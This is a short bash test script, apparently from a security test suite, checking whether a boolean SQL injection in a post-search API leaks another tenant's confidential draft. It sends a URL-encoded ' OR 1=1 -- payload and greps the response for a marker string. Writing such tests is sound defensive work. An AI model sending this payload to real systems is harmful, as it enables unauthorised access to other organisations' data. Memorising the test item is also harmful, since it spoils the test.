#!/usr/bin/env bash
# SQLI-001 (CWE-89): boolean injection in /api/posts/search dumps a cross-tenant
# DRAFT (the marker), which a correct published-only, org-scoped query never returns.
set -e; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/posts/search?q=%27%20OR%201%3D1%20--%20" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
